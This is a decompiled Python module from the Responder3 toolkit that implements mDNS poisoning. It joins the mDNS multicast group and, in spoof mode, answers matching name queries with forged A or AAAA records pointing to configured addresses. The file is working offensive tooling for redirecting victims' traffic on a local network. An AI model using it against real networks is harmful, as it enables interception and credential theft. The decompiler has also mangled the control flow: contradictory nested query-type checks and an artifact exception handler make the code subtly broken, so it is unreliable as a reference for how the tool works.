# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build\bdist.win-amd64\egg\responder3\poisoners\MDNS.py
# Compiled at: 2019-08-15 18:27:11
# Size of source mod 2**32: 5211 bytes
import re, socket, struct, logging, asyncio, ipaddress, traceback
from responder3.core.sockets import setup_base_socket
from responder3.core.commons import PoisonerMode, ResponderPlatform
from responder3.core.udpwrapper import UDPClient
from responder3.protocols.DNS import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession, ResponderServerGlobalSession

class MDNSGlobalSession(ResponderServerGlobalSession):

    def __init__(self, listener_socket_config, settings, log_queue):
        ResponderServerGlobalSession.__init__(self, log_queue, self.__class__.__name__)
        self.listener_socket_config = listener_socket_config
        self.settings = settings
        self.spooftable = []
        self.poisonermode = PoisonerMode.ANALYSE
        self.maddr = (
         '224.0.0.251', self.listener_socket_config.bind_port)
        if self.listener_socket_config.bind_addr.version == 6:
            self.maddr = (
             'FF02::FB', self.listener_socket_config.bind_port, 0, self.listener_socket_config.bind_iface_idx)
        self.parse_settings()

    def parse_settings(self):
        if self.settings is None:
            self.logger.info('No settings defined, adjusting to Analysis functionality!')
        else:
            if isinstance(self.settings['mode'], str):
                self.poisonermode = PoisonerMode[self.settings['mode'].upper()]
            if self.poisonermode == PoisonerMode.SPOOF:
                for exp in self.settings['spooftable']:
                    self.spooftable.append((re.compile(exp), ipaddress.ip_address(self.settings['spooftable'][exp])))


class MDNSSession(ResponderServerSession):

    def __init__(self, connection, log_queue):
        ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)


class MDNS(ResponderServer):

    @staticmethod
    def custom_socket(socket_config):
        if socket_config.bind_family == 4:
            mcast_addr = ipaddress.ip_address('224.0.0.251')
            sock = setup_base_socket(socket_config)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
            mreq = struct.pack('=4sl', mcast_addr.packed, socket.INADDR_ANY)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        else:
            mcast_addr = ipaddress.ip_address('FF02::FB')
            sock = setup_base_socket(socket_config,
              bind_ip_override=(ipaddress.ip_address('::') if socket_config.platform == ResponderPlatform.WINDOWS else None))
            sock.setsockopt(41 if socket_config.platform == ResponderPlatform.WINDOWS else socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, struct.pack('16sI', mcast_addr.packed, socket_config.bind_iface_idx))
        return sock

    def init(self):
        self.parser = DNSPacket

    async def parse_message(self):
        msg = await asyncio.wait_for((self.parser.from_streamreader(self.creader)), timeout=1)
        return msg

    async def send_data(self, data, addr):
        await asyncio.wait_for((self.cwriter.write(data, addr)), timeout=1)

    async def run(self):
        try:
            msg = await asyncio.wait_for((self.parse_message()), timeout=1)
            if msg.QR == DNSResponse.REQUEST:
                if self.globalsession.poisonermode == PoisonerMode.ANALYSE:
                    for q in msg.Questions:
                        await self.logger.poisonresult((self.globalsession.poisonermode), requestName=(q.QNAME.name), request_type=(q.QTYPE.name))

                else:
                    answers = []
                    for targetRE, ip in self.globalsession.spooftable:
                        for q in msg.Questions:
                            if not q.QTYPE == DNSType.A:
                                if q.QTYPE == DNSType.AAAA:
                                    if targetRE.match(q.QNAME.name):
                                        await self.logger.poisonresult((self.globalsession.poisonermode), requestName=(q.QNAME.name), poisonName=(str(targetRE)), poisonIP=ip, request_type=(q.QTYPE.name))
                                        res = None
                                        if ip.version == 4 and q.QTYPE == DNSType.A:
                                            res = DNSAResource.construct(q.QNAME.name, ip)
                                        else:
                                            if ip.version == 6 and q.QTYPE == DNSType.AAAA:
                                                res = DNSAAAAResource.construct(q.QNAME.name, ip)
                                            else:
                                                await self.logger.poisonresult((PoisonerMode.ANALYSE), requestName=(q.QNAME.name), request_type=(q.QTYPE.name))
                                        if res:
                                            answers.append(res)
                                    else:
                                        await self.logger.poisonresult((PoisonerMode.ANALYSE), requestName=(q.QNAME.name), request_type=(q.QTYPE.name))

                    response = DNSPacket.construct(TID=b'\x00\x00', response=(DNSResponse.RESPONSE),
                      answers=answers)
                    await asyncio.wait_for((self.send_data(response.to_bytes(), self.globalsession.maddr)), timeout=1)
        except Exception as e:
            try:
                raise e
            finally:
                e = None
                del e